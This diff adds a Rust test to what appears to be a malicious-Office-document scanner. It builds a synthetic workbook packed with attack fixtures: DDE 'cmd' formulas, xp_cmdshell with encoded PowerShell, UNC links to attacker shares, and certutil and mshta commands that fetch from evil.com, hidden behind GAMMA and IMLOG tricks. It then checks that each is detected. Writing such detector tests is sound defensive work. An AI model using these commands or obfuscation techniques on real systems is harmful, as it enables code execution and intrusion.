@@ -6039,3 +6039,248 @@ fn e2e_animation_watermark_datamodel_and_complex_math_threat_inspection() {
         "JSON missing VBA-CELL-064"
     );
 }
+
+#[test]
+fn e2e_pivotcache_embeddedpkg_extlink_and_trig_math_threat_inspection() {
+    let pivot_cache_def = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<pivotCacheDefinition xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" r:id="rId1">
+  <cacheSource type="external" connectionId="1">
+    <command>xp_cmdshell 'powershell.exe -enc payload'</command>
+  </cacheSource>
+</pivotCacheDefinition>"#;
+
+    let pivot_cache_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/pivotCacheRecords" Target="pivotCacheRecords1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/connection" Target="\\evil-server\share\leak.odc"/>
+</Relationships>"#;
+
+    let pivot_cache_records = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<pivotCacheRecords xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1">
+  <r>
+    <s v="=cmd|'/c calc'!A1"/>
+  </r>
+</pivotCacheRecords>"#;
+
+    // Disguised in-memory PE executable binary
+    let mut pe_bin = vec![0u8; 128];
+    pe_bin[0] = b'M';
+    pe_bin[1] = b'Z';
+    pe_bin[2] = 0x90;
+    pe_bin[3] = 0x00;
+    pe_bin[0x3c] = 0x40;
+    pe_bin[0x40] = b'P';
+    pe_bin[0x41] = b'E';
+
+    let payload_bat = b"@echo off\r\npowershell.exe -enc AAAA\r\n";
+
+    let word_doc_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="\\attacker\share\payload.bin"/>
+</Relationships>"#;
+
+    let word_doc_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:o="urn:schemas-microsoft-com:office:office">
+  <w:body>
+    <w:p>
+      <o:OLEObject ProgID="Package" UpdateMode="Always" r:id="rId1"/>
+    </w:p>
+  </w:body>
+</w:document>"#;
+
+    let ext_link_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <externalBook r:id="rId1">
+    <sheetNames>
+      <sheetName val="Sheet1"/>
+    </sheetNames>
+    <definedNames>
+      <definedName name="Auto_Open" refersTo="=cmd|'/c calc'!A1"/>
+    </definedNames>
+  </externalBook>
+</externalLink>"#;
+
+    let ext_link_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="\\10.0.0.1\share\workbook.xlsx" TargetMode="External"/>
+</Relationships>"#;
+
+    let src = "Sub Safe()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "PivotExtPkgProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["Safe"],
+    );
+
+    // Formulas exercising IMSIN, IMCOS, IMLOG2, IMLOG10, GAMMA, GAMMALN for de-obfuscation
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1"><f>IF(IMCOS(0)=&quot;1&quot;, &quot;cmd|'/c calc'!A1&quot;, &quot;&quot;)</f></c>
+      <c r="B1"><f>CONCAT(IF(IMLOG2(8)=&quot;3&quot;, &quot;powershell&quot;, &quot;&quot;), IF(IMLOG10(100)=&quot;2&quot;, &quot; -enc&quot;, &quot;&quot;))</f></c>
+      <c r="C1"><f>IF(GAMMA(5)=24, &quot;certutil -urlcache -split -f http://evil.com/payload.exe&quot;, &quot;&quot;)</f></c>
+      <c r="D1"><f>IF(GAMMALN(1)=0, &quot;mshta http://evil.com/hta&quot;, &quot;&quot;)</f></c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+</Types>"#;
+
+    let root_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let workbook_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", root_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        (
+            "xl/pivotCache/pivotCacheDefinition1.xml",
+            pivot_cache_def.as_bytes(),
+        ),
+        (
+            "xl/pivotCache/_rels/pivotCacheDefinition1.xml.rels",
+            pivot_cache_rels.as_bytes(),
+        ),
+        (
+            "xl/pivotCache/pivotCacheRecords1.xml",
+            pivot_cache_records.as_bytes(),
+        ),
+        ("word/embeddings/oleObject1.bin", &pe_bin),
+        ("word/embeddings/payload.bat", payload_bat),
+        ("word/_rels/document.xml.rels", word_doc_rels.as_bytes()),
+        ("word/document.xml", word_doc_xml.as_bytes()),
+        (
+            "xl/externalLinks/externalLink1.xml",
+            ext_link_xml.as_bytes(),
+        ),
+        (
+            "xl/externalLinks/_rels/externalLink1.xml.rels",
+            ext_link_rels.as_bytes(),
+        ),
+    ];
+
+    let zip_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify Excel PivotCache threats (VBA-CELL-065)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "ExcelPivotCacheOrDefinitionAnomaly"
+                && (t.coordinate.contains("pivotCache:databaseCommand")
+                    || t.coordinate.contains("pivotCache:uncCoercion")
+                    || t.coordinate.contains("pivotCache:cloakedDde"))),
+        "Should detect ExcelPivotCacheOrDefinitionAnomaly (VBA-CELL-065): {threats:?}"
+    );
+
+    // 2. Verify Word/PowerPoint Embedded Package threats (VBA-CELL-066)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "WordOrPowerPointEmbeddedPackageAnomaly"
+                && (t.coordinate.contains("embeddedPackage:peBinary")
+                    || t.coordinate.contains("embeddedPackage:stagedScript")
+                    || t.coordinate.contains("embeddedPackage:autoActivate")
+                    || t.coordinate.contains("embeddedPackage:uncCoercion"))
+        ),
+        "Should detect WordOrPowerPointEmbeddedPackageAnomaly (VBA-CELL-066): {threats:?}"
+    );
+
+    // 3. Verify Excel External Workbook threats (VBA-CELL-067)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "ExcelExternalBookOrSheetPathAnomaly"
+                && (t.coordinate.contains("externalBook:uncCoercion")
+                    || t.coordinate.contains("externalBook:cloakedDde"))),
+        "Should detect ExcelExternalBookOrSheetPathAnomaly (VBA-CELL-067): {threats:?}"
+    );
+
+    // 4. Verify mathematical formula de-obfuscation in cells
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && (t.threat_kind == "DDE"
+                || t.threat_kind == "DDEExecutionFormula"
+                || t.threat_kind == "DeobfuscatedThreat")
+            && t.formula.contains("cmd")),
+        "Cell A1 should resolve DDE cmd execution threat through IMCOS: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through IMLOG2/IMLOG10: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("certutil")),
+        "Cell C1 should resolve certutil threat through GAMMA evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "D1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("mshta")),
+        "Cell D1 should resolve mshta threat through GAMMALN evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-065, VBA-CELL-066, VBA-CELL-067
+    let sarif = inspection_to_sarif(&inspection, "file:///test/pivot_embedded_extlink.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-065"),
+        "SARIF must contain VBA-CELL-065 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-066"),
+        "SARIF must contain VBA-CELL-066 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-067"),
+        "SARIF must contain VBA-CELL-067 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-065, VBA-CELL-066, VBA-CELL-067
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-065\""),
+        "JSON missing VBA-CELL-065"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-066\""),
+        "JSON missing VBA-CELL-066"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-067\""),
+        "JSON missing VBA-CELL-067"
+    );
+}
